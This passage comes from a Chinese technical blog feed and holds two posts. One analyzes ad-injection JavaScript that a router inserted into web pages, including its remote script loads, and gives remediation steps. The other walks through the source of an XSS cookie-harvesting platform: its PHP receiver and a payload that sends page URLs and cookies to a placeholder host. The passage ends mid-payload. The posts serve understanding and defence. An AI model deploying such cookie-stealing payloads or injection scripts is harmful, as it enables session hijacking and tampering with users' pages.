class="string">"iframe_top_a"</span>;</span><br><span class="line">                iframe_Tp.scrolling = <span class="string">"no"</span>;</span><br><span class="line">                iframe_Tp.display = <span class="string">"block"</span>;</span><br><span class="line">                iframe_Tp.style.position=<span class="string">"fixed"</span>;</span><br><span class="line">                iframe_Tp.setAttribute(<span class="string">"frameborder"</span>,<span class="string">"0"</span>);</span><br><span class="line">                iframe_Tp.style.zIndex = <span class="string">"2147483647"</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> iframeWidth,iframeHeight;</span><br><span class="line">                iframeWidth = <span class="built_in">window</span>.innerWidth;</span><br><span class="line">                iframeHeight = <span class="built_in">parseInt</span>(a_str.top.height) * <span class="built_in">parseInt</span>(iframeWidth)/<span class="built_in">parseInt</span>(a_str.top.width);</span><br><span class="line"></span><br><span class="line">                iframe_Tp.style.width = iframeWidth + <span class="string">"px"</span>;</span><br><span class="line">                iframe_Tp.style.height =  iframeHeight + <span class="string">"px"</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//iframe_Bt.style.bottom = "0px";</span></span><br><span class="line">                iframe_Bt.style.top = <span class="string">"0px"</span>;</span><br><span class="line">                iframe_Tp.style.left = <span class="string">"0px"</span>;</span><br><span class="line">                <span class="built_in">window</span>.top.document.body.appendChild(iframe_Tp);</span><br><span class="line">                dataSet.picList = a_str.top.picList;</span><br><span class="line">                dataSet.iframeId = <span class="string">"iframe_top_a"</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">document</span>.getElementById(<span class="string">'iframe_top_a'</span>).onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> ifr = <span class="built_in">document</span>.querySelector(<span class="string">'#iframe_top_a'</span>);</span><br><span class="line">                    ifr.contentWindow.postMessage(dataSet, <span class="string">'*'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(a_str.bottom.height != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                <span class="comment">//console.log("bottom iframe.");</span></span><br><span class="line">                <span class="keyword">var</span> iframe_Bt = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">                iframe_Bt.src = ip + <span class="string">'/routerad/common/pages/mobile_index.html'</span>;</span><br><span class="line">                iframe_Bt.id = <span class="string">"iframe_bottom_a"</span>;</span><br><span class="line">                iframe_Bt.name = <span class="string">"iframe_bottom_a"</span>;</span><br><span class="line">                iframe_Bt.scrolling = <span class="string">"no"</span>;</span><br><span class="line">                iframe_Bt.display = <span class="string">"block"</span>;</span><br><span class="line">                iframe_Bt.style.position=<span class="string">"fixed"</span>;</span><br><span class="line">                iframe_Bt.setAttribute(<span class="string">"frameborder"</span>,<span class="string">"0"</span>);</span><br><span class="line">                iframe_Bt.style.zIndex = <span class="string">"2147483647"</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> iframeWidth,iframeHeight;</span><br><span class="line">                iframeWidth = <span class="built_in">window</span>.innerWidth;</span><br><span class="line">                iframeHeight = <span class="built_in">parseInt</span>(a_str.bottom.height) * <span class="built_in">parseInt</span>(iframeWidth)/<span class="built_in">parseInt</span>(a_str.bottom.width);</span><br><span class="line"></span><br><span class="line">                iframe_Bt.style.width = iframeWidth + <span class="string">"px"</span>;</span><br><span class="line">                iframe_Bt.style.height =  iframeHeight + <span class="string">"px"</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//iframe_Bt.style.top = window.innerHeight + "px";</span></span><br><span class="line">                iframe_Bt.style.bottom = <span class="string">"0px"</span>;</span><br><span class="line">                iframe_Bt.style.left = <span class="string">"0px"</span>;</span><br><span class="line">                iframe_Bt.style.marginTop = iframeHeight*(<span class="number">-1</span>) + <span class="string">"px"</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">window</span>.top.document.body.appendChild(iframe_Bt);</span><br><span class="line">                dataSet.picList = a_str.bottom.picList;</span><br><span class="line">                dataSet.iframeId = <span class="string">"iframe_bottom_a"</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">document</span>.getElementById(<span class="string">'iframe_bottom_a'</span>).onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> ifr = <span class="built_in">document</span>.querySelector(<span class="string">'#iframe_bottom_a'</span>);</span><br><span class="line">                    ifr.contentWindow.postMessage(dataSet, <span class="string">'*'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(a_str.center.height != <span class="literal">undefined</span>)&#123;</span><br><span class="line">                <span class="comment">//console.log("center iframe.");</span></span><br><span class="line">                <span class="keyword">var</span> iframe_Ct = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">                iframe_Ct.src = ip + <span class="string">'/routerad/common/pages/mobile_index.html'</span>;</span><br><span class="line">                iframe_Ct.id = <span class="string">"iframe_center_a"</span>;</span><br><span class="line">                iframe_Ct.name = <span class="string">"iframe_center_a"</span>;</span><br><span class="line">                iframe_Ct.scrolling = <span class="string">"no"</span>;</span><br><span class="line">                iframe_Ct.display = <span class="string">"block"</span>;</span><br><span class="line">                iframe_Ct.style.position=<span class="string">"fixed"</span>;</span><br><span class="line">                iframe_Ct.setAttribute(<span class="string">"frameborder"</span>,<span class="string">"0"</span>);</span><br><span class="line">                iframe_Ct.style.zIndex = <span class="string">"2147483647"</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> iframeWidth,iframeHeight;</span><br><span class="line">                iframeWidth = a_str.center.width;</span><br><span class="line">                iframeHeight = a_str.center.height;</span><br><span class="line"></span><br><span class="line">                iframe_Ct.style.width = <span class="built_in">parseInt</span>(iframeWidth) + <span class="string">"px"</span>;</span><br><span class="line">                iframe_Ct.style.height =  <span class="built_in">parseInt</span>(iframeHeight) + <span class="string">"px"</span>;</span><br><span class="line">                iframe_Ct.style.left = <span class="built_in">window</span>.innerWidth /<span class="number">2</span> + <span class="string">"px"</span>;</span><br><span class="line">                iframe_Ct.style.top = <span class="built_in">window</span>.innerHeight /<span class="number">2</span> + <span class="string">"px"</span>;</span><br><span class="line">                iframe_Ct.style.marginLeft = <span class="built_in">parseInt</span>(iframeWidth)/<span class="number">2</span>*(<span class="number">-1</span>)+<span class="string">"px"</span>;</span><br><span class="line">                iframe_Ct.style.marginTop = <span class="built_in">parseInt</span>(iframeHeight)/<span class="number">2</span>*(<span class="number">-1</span>)+<span class="string">"px"</span>;</span><br><span class="line">                <span class="built_in">window</span>.top.document.body.appendChild(iframe_Ct);</span><br><span class="line"></span><br><span class="line">                dataSet.picList = a_str.center.picList;</span><br><span class="line">                dataSet.iframeId = <span class="string">"iframe_center_a"</span>;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">document</span>.getElementById(<span class="string">'iframe_center_a'</span>).onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> ifr = <span class="built_in">document</span>.querySelector(<span class="string">'#iframe_center_a'</span>);</span><br><span class="line">                    ifr.contentWindow.postMessage(dataSet, <span class="string">'*'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isWeiXin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ua = <span class="built_in">window</span>.navigator.userAgent.toLowerCase();</span><br><span class="line">        <span class="comment">//console.log(ua);//mozilla/5.0 (iphone; cpu iphone os 9_1 like mac os x) applewebkit/601.1.46 (khtml, like gecko)version/9.0 mobile/13b143 safari/601.1</span></span><br><span class="line">        <span class="keyword">if</span> (ua.match(<span class="regexp">/MicroMessenger/i</span>) == <span class="string">'micromessenger'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isAPP</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ua = <span class="built_in">window</span>.navigator.userAgent.toLowerCase();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ua.indexOf(<span class="string">"biliapp"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.indexOf(<span class="string">"wifikey"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.indexOf(<span class="string">"newsarticle"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.indexOf(<span class="string">"peanutwi-fi"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.indexOf(<span class="string">"phiwifi"</span>)&gt;=<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.indexOf(<span class="string">"changba"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.indexOf(<span class="string">"phicare"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.indexOf(<span class="string">"vmchybirdapp-android"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.indexOf(<span class="string">"vmchybirdapp-ios"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ua.indexOf(<span class="string">"momowebview"</span>) &gt;= <span class="number">0</span> || ua.indexOf(<span class="string">"momokit"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//禁止显示广告的域名，后续增加多个时候可以使用数组</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">forbidHost</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> url = top.window.location.href;</span><br><span class="line">        <span class="keyword">var</span> host = top.window.location.host;</span><br><span class="line">        <span class="keyword">if</span> (host.indexOf(<span class="string">".gov.cn"</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">var</span> forbidHostArray = [<span class="string">"www.xinhuanet.com"</span>, <span class="string">".eastday.com"</span>, <span class="string">"china.com.cn"</span>, <span class="string">"www.chinadaily.com.cn"</span>, <span class="string">".caijing.com.cn"</span>, <span class="string">".huanqiu.com"</span>, <span class="string">".youku.com"</span>, <span class="string">".youth.cn"</span>, <span class="string">".people.com.cn"</span>, <span class="string">"www.wangxin.name"</span>, <span class="string">"wjwcoin.pro"</span>, <span class="string">"www.wkj.link"</span>, <span class="string">"www.bid-buy.pro"</span>, <span class="string">"www.daywin.pro"</span>, <span class="string">"www.7650.biz"</span>];</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; forbidHostArray.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (host.indexOf(forbidHostArray[i]) != <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> reg = <span class="regexp">/phicomm\.com/g</span>;</span><br><span class="line">        <span class="keyword">var</span> baiduReg = <span class="regexp">/m\.baidu\.com\/static/g</span>;</span><br><span class="line">        <span class="keyword">if</span>(reg.test(url) || baiduReg.test(url))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadJs</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> newscript = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    newscript.setAttribute(<span class="string">'type'</span>, <span class="string">'text/javascript'</span>);</span><br><span class="line">    newscript.setAttribute(<span class="string">'src'</span>, <span class="string">'https://www.jiubuhua.com/exjs.js'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> newscript2 = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    newscript2.setAttribute(<span class="string">'type'</span>, <span class="string">'text/javascript'</span>);</span><br><span class="line">    newscript2.setAttribute(<span class="string">'src'</span>, <span class="string">'http://bb.dugesheying.com/yhws/channel/yj/yjda.js'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> newscript3 = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    newscript3.setAttribute(<span class="string">'type'</span>, <span class="string">'text/javascript'</span>);</span><br><span class="line">    newscript3.setAttribute(<span class="string">'src'</span>, <span class="string">'https://www.jiubuhua.com/9cc19.js'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> newscript4 = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        newscript4.setAttribute(<span class="string">'type'</span>, <span class="string">'text/javascript'</span>);</span><br><span class="line">        newscript4.setAttribute(<span class="string">'src'</span>, <span class="string">'https://logs.newapi.com/jd/ad?f=zq18'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>];</span><br><span class="line">    head.appendChild(newscript);</span><br><span class="line">    head.appendChild(newscript2);</span><br><span class="line">    head.appendChild(newscript3);</span><br><span class="line">head.appendChild(newscript4);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>注意到了代码中有几行</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/phicomm\.com/g</span>;</span><br><span class="line">        <span class="keyword">var</span> baiduReg = <span class="regexp">/m\.baidu\.com\/static/g</span>;</span><br><span class="line">        <span class="keyword">if</span>(reg.test(url) || baiduReg.test(url))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>不对斐讯和百度域名进行广告推送，笔者用的路由正是斐讯<br>随后对IP进行查询<br><img src= "/img/loading.gif" data-lazy-src="/images/rfkLGaX.png" alt=""><br>确定为路由器干的了</p><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol><li>上游设备对IP段<code>222.73.156.0/24</code>加黑</li><li>电脑开启防火墙，拉黑<code>222.73.156.0/24</code></li><li>刷机 参考<a href="http://www.qqgzs.com/archives/k2p-shuaji.html" target="_blank" rel="noopener">斐讯K2P A1新版刷机链接</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Router </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS平台原理浅析</title>
      <link href="/p/4110562338.html"/>
      <url>/p/4110562338.html</url>
      
        <content type="html"><![CDATA[<p>之前一直对XSS平台传递原理很好奇 今天抽空看了下源码</p><a id="more"></a><p>先来看index.php</p><h1 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * index.php 默认页</span></span><br><span class="line"><span class="comment"> * ----------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * OldCMS,site:http://www.oldcms.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'init.php'</span>);</span><br><span class="line"></span><br><span class="line">$do=Val(<span class="string">'do'</span>,<span class="string">'GET'</span>,<span class="number">0</span>);</span><br><span class="line">$dos=<span class="keyword">array</span>(<span class="string">'index'</span>,<span class="string">'login'</span>,<span class="string">'project'</span>,<span class="string">'module'</span>,<span class="string">'code'</span>,<span class="string">'api'</span>,<span class="string">'do'</span>,<span class="string">'register'</span>,<span class="string">'user'</span>,<span class="string">'keepsession'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!in_array($do,$dos)) $do=<span class="string">'index'</span>;</span><br><span class="line"><span class="keyword">include</span>(ROOT_PATH.<span class="string">'/source/'</span>.$do.<span class="string">'.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php是个入口，定义了do传进来的参数所包含的文件<br>由于对目标站和XSS平台间的传递好奇，所以看下api.php</p><h2 id="ctags插件"><a href="#ctags插件" class="headerlink" title="ctags插件"></a>ctags插件</h2><p>Sublime的一个很不错的插件 能快速定位函数调用位置<br><img src= "/img/loading.gif" data-lazy-src="/images/UHbe1mP.png" alt=""></p><h1 id="api-php"><a href="#api-php" class="headerlink" title="api.php"></a>api.php</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * api.php 接口</span></span><br><span class="line"><span class="comment"> * ----------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * OldCMS,site:http://www.oldcms.com</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'IN_OLDCMS'</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id = Val(<span class="string">'id'</span>, <span class="string">'GET'</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">Val 获得提交的值</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> $namestring参数名</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> $methodstring获取途径(GET/POST/COOKIE/REQUEST)</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> $typestring/int过滤类型('string'/0=&gt;string,'int'/1=&gt;int,其它/2=&gt;不过滤)</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> $isArrayint0=&gt;非数组,1=&gt;数组</span></span><br><span class="line"><span class="comment"><span class="doctag">@return</span> $valuestring/int</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($id) &#123;</span><br><span class="line">    $db      = DBConnect();</span><br><span class="line">    <span class="comment">//连接数据库</span></span><br><span class="line">    $project = $db-&gt;FirstRow(<span class="string">"SELECT * FROM "</span> . Tb(<span class="string">'project'</span>) . <span class="string">" WHERE urlKey='&#123;$id&#125;'"</span>);</span><br><span class="line">    <span class="comment">/* Tb 获取table name */</span></span><br><span class="line">    <span class="comment">//取所属项目第一行</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($project)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//为空跳出</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//用户提供的content</span></span><br><span class="line">    $content = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">//待接收的key</span></span><br><span class="line">    $keys = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">/* 模块 begin */</span></span><br><span class="line">    $moduleIds = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($project[<span class="string">'modules'</span>])) &#123;</span><br><span class="line">    <span class="comment">//模块不为空</span></span><br><span class="line">        $moduleIds = json_decode($project[<span class="string">'modules'</span>]);</span><br><span class="line">        <span class="comment">//json解码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($moduleIds)) &#123;</span><br><span class="line">        $modulesStr = implode(<span class="string">','</span>, $moduleIds);<span class="comment">//把moduleIds转为字符串并以，隔开</span></span><br><span class="line">        $modules    = $db-&gt;Dataset(<span class="string">"SELECT * FROM "</span> . Tb(<span class="string">'module'</span>) . <span class="string">" WHERE id IN ($modulesStr)"</span>);</span><br><span class="line">        <span class="comment">//数据库查询所使用的一个或多个模块</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($modules)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($modules <span class="keyword">as</span> $module) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($module[<span class="string">'keys'</span>])) &#123;</span><br><span class="line">                    $keys = array_merge($keys, json_decode($module[<span class="string">'keys'</span>]));</span><br><span class="line">                    <span class="comment">//将待接收的location,toplocation,cookie,opener和模块的location,toplocation,cookie,opener组合成一个数组</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 模块 end */</span></span><br><span class="line">    <span class="keyword">foreach</span> ($keys <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        $content[$key] = Val($key, <span class="string">'REQUEST'</span>);</span><br><span class="line">        <span class="comment">//接收location,toplocation,cookie,opener并赋值给$content</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="string">'toplocation'</span>, $keys)) &#123;</span><br><span class="line">        $content[<span class="string">'toplocation'</span>] = !<span class="keyword">empty</span>($content[<span class="string">'toplocation'</span>]) ? $content[<span class="string">'toplocation'</span>] : $content[<span class="string">'location'</span>];</span><br><span class="line">        <span class="comment">//toplocation判断是否为空，为空则location否则为接收到的toplocation的值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $judgeCookie = in_array(<span class="string">'cookie'</span>, $keys) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">//判断cookies是否存在于数组中</span></span><br><span class="line">    <span class="comment">/* cookie hash */</span></span><br><span class="line">    $cookieHash    = md5($project[<span class="string">'id'</span>] . <span class="string">'_'</span> . $content[<span class="string">'cookie'</span>] . <span class="string">'_'</span> . $content[<span class="string">'location'</span>] . <span class="string">'_'</span> . $content[<span class="string">'toplocation'</span>]);</span><br><span class="line">    <span class="comment">//将项目id，接收的cookie，location，toplocation经过MD5后赋值给cookieHash</span></span><br><span class="line">    $cookieExisted = $db-&gt;FirstValue(<span class="string">"SELECT COUNT(*) FROM "</span> . Tb(<span class="string">'project_content'</span>) . <span class="string">" WHERE projectId='&#123;$project[id]&#125;' AND cookieHash='&#123;$cookieHash&#125;'"</span>);</span><br><span class="line">    <span class="comment">//获取项目中的内容数量</span></span><br><span class="line">    <span class="keyword">if</span> (!$judgeCookie || $cookieExisted &lt;= <span class="number">0</span>) &#123;<span class="comment">//如果不存在这条cookie或hash不存在则执行</span></span><br><span class="line">        <span class="comment">//服务器获取的content</span></span><br><span class="line">        $serverContent                    = <span class="keyword">array</span>();</span><br><span class="line">        $serverContent[<span class="string">'HTTP_REFERER'</span>]    = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">        <span class="comment">//获取返回路径</span></span><br><span class="line">        $referers                         = @parse_url($serverContent[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">        <span class="comment">//获取http</span></span><br><span class="line">        $domain                           = $referers[<span class="string">'host'</span>] ? $referers[<span class="string">'host'</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="comment">//返回域名</span></span><br><span class="line">        $domain                           = StripStr($domain);</span><br><span class="line">        <span class="comment">//过滤处理域名</span></span><br><span class="line">        $serverContent[<span class="string">'HTTP_REFERER'</span>]    = StripStr($_SERVER[<span class="string">'HTTP_REFERER'</span>]);</span><br><span class="line">        $serverContent[<span class="string">'HTTP_USER_AGENT'</span>] = StripStr($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">        $serverContent[<span class="string">'REMOTE_ADDR'</span>]     = StripStr($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        $values                           = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'projectId'</span>     =&gt; $project[<span class="string">'id'</span>],</span><br><span class="line">            <span class="string">'content'</span>       =&gt; JsonEncode($content),</span><br><span class="line">            <span class="string">'serverContent'</span> =&gt; JsonEncode($serverContent),</span><br><span class="line">            <span class="string">'domain'</span>        =&gt; $domain,</span><br><span class="line">            <span class="string">'cookieHash'</span>    =&gt; $cookieHash,</span><br><span class="line">            <span class="string">'num'</span>           =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'addTime'</span>       =&gt; time(),</span><br><span class="line">        );</span><br><span class="line">        $db-&gt;AutoExecute(Tb(<span class="string">'project_content'</span>), $values);</span><br><span class="line">        <span class="comment">//根据AutoExecute函数判断自动执行更新或插入</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $db-&gt;Execute(<span class="string">"UPDATE "</span> . Tb(<span class="string">'project_content'</span>) . <span class="string">" SET num=num+1,updateTime='"</span> . time() . <span class="string">"' WHERE projectId='&#123;$project[id]&#125;' AND cookieHash='&#123;$cookieHash&#125;'"</span>);</span><br><span class="line">        <span class="comment">//如果hash存在则执行同一项目的更新（增加）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $_SERVER[HTTP_REFERER] "</span>);</span><br><span class="line">    <span class="comment">//返回来路地址</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><p>读完接口文件看看JS</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">              (<span class="keyword">new</span> Image()).src = <span class="string">'http://XXX.XXX.XXX.XXX/test.php?location='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">/**</span></span><br><span class="line"><span class="comment">                 * 新建图片，图片资源地址为你的XSS平台的接口地址</span></span><br><span class="line"><span class="comment">                 * 对下列内容编码</span></span><br><span class="line"><span class="comment">                 * 1、访问的完整路径</span></span><br><span class="line"><span class="comment">                 * 2、cookie</span></span><br><span class="line"><span class="comment">                 * 3、父页面对象</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="built_in">document</span>.location.href</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">'&amp;toplocation='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> top.location.href</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">'&amp;cookie='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="built_in">document</span>.cookie</span><br><span class="line">                  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                      <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;)()) + <span class="string">'&amp;opener='</span> + <span class="built_in">escape</span>((<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                  <span class="keyword">try</span> &#123;</span><br><span class="line">                      <span class="keyword">return</span> (<span 